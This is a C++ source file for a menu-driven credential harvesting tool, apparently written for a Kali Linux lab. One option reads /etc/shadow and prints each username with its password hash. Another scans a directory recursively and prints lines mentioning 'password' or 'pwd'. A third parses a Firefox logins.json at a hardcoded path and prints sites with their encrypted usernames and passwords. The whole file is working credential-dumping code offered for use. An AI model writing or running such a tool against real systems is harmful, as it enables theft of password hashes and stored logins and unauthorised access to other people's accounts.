#include <iostream>
#include <filesystem>
#include <fstream>
#include <string>
#include <nlohmann/json.hpp> // JSON for Modern C++ library

using namespace std;
namespace fs = std::filesystem;

// Function to retrieve usernames and password hashes from /etc/shadow
void retrieveShadowPasswords() {
    ifstream shadowFile("/etc/shadow");
    if (!shadowFile.is_open()) {
        cerr << "Error: Unable to open /etc/shadow. Run as root." << endl;
        return;
    }

    string line;
    while (getline(shadowFile, line)) {
        size_t colonPos = line.find(':');
        if (colonPos != string::npos) {
            string username = line.substr(0, colonPos);
            string hash = line.substr(colonPos + 1, line.find(':', colonPos + 1) - colonPos - 1);
            cout << "Username: " << username << ", Password Hash: " << hash << endl;
        }
    }
    shadowFile.close();
}

// Function to check if a file contains password-related keywords
bool containsPassword(const string& filePath) {
    ifstream file(filePath);
    if (!file.is_open()) return false;

    string line;
    while (getline(file, line)) {
        if (line.find("password") != string::npos || line.find("pwd") != string::npos) {
            cout << "Possible password found in file: " << filePath << "\nContent: " << line << endl;
            return true;
        }
    }
    return false;
}

// Function to scan a directory recursively for files containing password-related keywords
void scanDirectory(const string& dirPath) {
    for (const auto& entry : fs::recursive_directory_iterator(dirPath)) {
        if (entry.is_regular_file()) {
            containsPassword(entry.path().string());
        }
    }
}

// Function to retrieve encrypted usernames and passwords from Firefox's logins.json
void retrieveFirefoxPasswords() {
    string filePath = "/home/kali/.mozilla/firefox/p50jsnvg.default-esr/logins.json"; // Default path
    ifstream file(filePath, ifstream::binary);
    if (!file.is_open()) {
        cerr << "Error: Unable to open " << filePath << endl;
        return;
    }

    nlohmann::json loginsData;
    try {
        file >> loginsData;
    } catch (const nlohmann::json::parse_error& e) {
        cerr << "Error parsing JSON file: " << e.what() << endl;
        return;
    }

    if (loginsData.contains("logins")) {
        const auto& logins = loginsData["logins"];
        for (const auto& login : logins) {
            string hostname = login["hostname"];
            string username = login["encryptedUsername"];
            string password = login["encryptedPassword"];

            cout << "URL: " << hostname << "\n"
                 << "Encrypted Username: " << username << "\n"
                 << "Encrypted Password: " << password << "\n"
                 << endl;
        }
    } else {
        cerr << "No logins found in the file." << endl;
    }
}

// Menu function to choose between shadow file retrieval, directory scanning, and Firefox password extraction
void displayMenu() {
    int choice;
    cout << "Choose an option:\n";
    cout << "1. Retrieve usernames and password hashes from /etc/shadow\n";
    cout << "2. Scan a directory for files containing possible passwords\n";
    cout << "3. Retrieve Firefox encrypted usernames and passwords (default path)\n";
    cout << "Enter your choice: ";
    cin >> choice;

    switch (choice) {
        case 1:
            retrieveShadowPasswords();
            break;
        case 2: {
            string directory;
            cout << "Enter directory to scan for passwords: ";
            cin >> directory;

            if (fs::exists(directory) && fs::is_directory(directory)) {
                scanDirectory(directory);
            } else {
                cerr << "Invalid directory path!" << endl;
            }
            break;
        }
        case 3:
            retrieveFirefoxPasswords();
            break;
        default:
            cerr << "Invalid choice!" << endl;
            break;
    }
}

int main() {
    displayMenu();
    return 0;
}

